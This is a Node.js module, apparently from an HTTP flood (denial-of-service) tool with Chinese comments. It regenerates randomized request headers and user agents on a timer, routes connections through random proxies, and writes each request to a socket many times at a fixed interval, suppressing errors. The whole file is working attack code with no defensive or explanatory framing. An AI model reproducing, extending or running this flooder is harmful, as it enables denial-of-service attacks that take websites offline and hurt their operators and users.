const net = require('net')
const header = require('../header')
const proxy = require('../proxy')
const ua = require('../ua')

module.exports = (config) => {
    let data = null;

    // 更新数据
    const updateData = () => {
        data = header.make({
            url: config.url,
            host: config.urls.host,
            ua: ua.make(),
            post: config.post,
            post_length: config.post.length 
        })
        data = header.random(data, config.randomlength)
    }

    // 首次更新
    updateData()

    // 定时更新
    setInterval(updateData, config.random)

    setInterval(() => {
        const proxyer = proxy.make()
        const socket = net.connect(proxyer[1], proxyer[0]);
        socket.setKeepAlive(true, config.timeout)
        socket.setTimeout(config.timeout)
        socket.once('error', () => {
            //console.log('Error : ' + proxyer[0] + ":" + proxyer[1])
        });
        socket.once('disconnect', () => {
            console.log('Disconnect')
        });
        socket.once('data', () => {
            //console.log('Connected : ' + proxyer[0] + ":" + proxyer[1])
        });

        for (let j = 0; j < config.rate; j++) {
            socket.write(data);
        }
    
        socket.on('data', () => {
            setTimeout(() => {
                socket.destroy()
                delete socket
            }, config.time);
        })
    }, config.speed)
}
